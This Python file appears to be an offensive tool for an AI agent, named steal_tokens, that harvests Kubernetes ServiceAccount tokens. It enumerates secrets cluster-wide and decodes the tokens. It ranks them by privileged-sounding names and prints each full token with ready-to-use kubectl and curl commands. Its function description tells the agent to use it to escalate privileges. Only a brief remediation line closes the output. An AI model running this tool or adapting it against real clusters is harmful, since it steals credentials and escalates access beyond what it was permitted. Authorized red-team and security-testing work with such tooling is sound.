import base64
import json

from kubernetes.client.rest import ApiException

INTERESTING_PATTERNS = [
    "admin",
    "cluster",
    "deploy",
    "ci",
    "cd",
    "root",
    "operator",
    "controller",
    "manager",
    "prod",
    "secret",
    "vault",
    "system",
    "master",
    "privileged",
]


def _score(sa_name: str) -> str:
    if any(p in sa_name.lower() for p in INTERESTING_PATTERNS):
        return "HIGH VALUE"
    return "LOW VALUE"


def _decode_jwt(raw: str) -> dict:
    try:
        parts = raw.split(".")
        if len(parts) != 3:
            return {}
        payload = json.loads(base64.b64decode(parts[1] + "==").decode("utf-8", errors="replace"))
        k8s = payload.get("kubernetes.io", {})
        return {
            "serviceaccount": k8s.get("serviceaccount", {}).get("name", "unknown"),
            "namespace": k8s.get("namespace", "unknown"),
            "expiry": payload.get("exp", "none — static token ⚠"),
        }
    except Exception:
        return {}


def steal_tokens(k8s, namespace: str = "all") -> str:
    try:
        if namespace == "all":
            secret_list = k8s.list_secret_for_all_namespaces()
        else:
            secret_list = k8s.list_namespaced_secret(namespace=namespace)

    except ApiException as e:
        if e.status == 403:
            return "✗ Secret read access denied — cannot perform token theft."
        return f"Kubernetes API error: {e.status} {e.reason}"

    # filter to SA token type only
    sa_tokens = [s for s in secret_list.items if s.type == "kubernetes.io/service-account-token" and s.data and "token" in s.data]

    if not sa_tokens:
        return "No static ServiceAccount tokens found. Cluster may be using projected tokens (1.24+) which are not stored in secrets."

    # sort high value first
    sa_tokens.sort(
        key=lambda s: 0 if _score((s.metadata.annotations or {}).get("kubernetes.io/service-account.name", "")) == "HIGH VALUE" else 1
    )

    lines = [f"⚠ Found {len(sa_tokens)} static SA token(s) — these do not expire and survive pod deletion:\n"]

    for i, secret in enumerate(sa_tokens, 1):
        ns = secret.metadata.namespace
        name = secret.metadata.name
        sa_name = (secret.metadata.annotations or {}).get("kubernetes.io/service-account.name", "unknown")
        score = _score(sa_name)

        try:
            raw_token = base64.b64decode(secret.data["token"]).decode("utf-8")
        except Exception:
            raw_token = None

        decoded = _decode_jwt(raw_token) if raw_token else {}

        lines.append(f"{'─' * 55}")
        lines.append(f"  {i}. {ns}/{name} — {score}")
        lines.append(f"     ServiceAccount: {sa_name}")
        lines.append(f"     Namespace:      {decoded.get('namespace', ns)}")
        lines.append(f"     Expiry:         {decoded.get('expiry', 'unknown')}")
        lines.append("")

        if raw_token:
            lines.append(f"     Token (first 40 chars): {raw_token[:40]}...")
            lines.append("")
            lines.append("     ── Set and use ──────────────────────────────────")
            lines.append(f"     export STOLEN_TOKEN='{raw_token}'")
            lines.append("")
            lines.append("     ── kubectl ──────────────────────────────────────")
            lines.append("     kubectl --token=$STOLEN_TOKEN get secrets --all-namespaces")
            lines.append("     kubectl --token=$STOLEN_TOKEN auth can-i --list")
            lines.append("")
            lines.append("     ── curl in-cluster (no kubectl needed) ──────────")
            lines.append(
                '     curl -H "Authorization: Bearer $STOLEN_TOKEN" \\\n'
                "       https://kubernetes.default.svc/api/v1/secrets \\\n"
                "       --cacert /var/run/secrets/kubernetes.io/"
                "serviceaccount/ca.crt"
            )
            lines.append("")
            lines.append("     ── check what this token can do ─────────────────")
            lines.append(
                f'     curl -H "Authorization: Bearer $STOLEN_TOKEN" \\\n'
                f"       https://kubernetes.default.svc/apis/authorization.k8s.io"
                f"/v1/selfsubjectrulesreviews \\\n"
                f"       --cacert /var/run/secrets/kubernetes.io/"
                f"serviceaccount/ca.crt \\\n"
                f"       -X POST -H 'Content-Type: application/json' \\\n"
                f'       -d \'{{"apiVersion":'
                f'"authorization.k8s.io/v1",'
                f'"kind":"SelfSubjectRulesReview",'
                f'"spec":{{"namespace":"{ns}"}}}}\''
            )
        else:
            lines.append("     Token: [could not decode]")

        lines.append("")

    lines.append(
        "Fix: disable static token creation — use projected tokens via "
        "TokenRequest API. Set "
        "automountServiceAccountToken: false on pods that don't need API access."
    )

    return "\n".join(lines)


definition = {
    "type": "function",
    "function": {
        "name": "steal_tokens",
        "description": (
            "Steal ServiceAccount tokens from Kubernetes secrets. "
            "Requires secret read access — confirm with list_permissions first. "
            "Finds static non-expiring SA tokens, decodes them, scores by SA name, "
            "and outputs ready-to-use export commands, kubectl commands, "
            "and curl commands for in-cluster use without kubectl. "
            "Use to escalate privileges if current SA is limited."
        ),
        "parameters": {
            "type": "object",
            "properties": {"namespace": {"type": "string", "description": "Namespace to search, or 'all' for cluster-wide."}},
            "required": [],
        },
    },
}
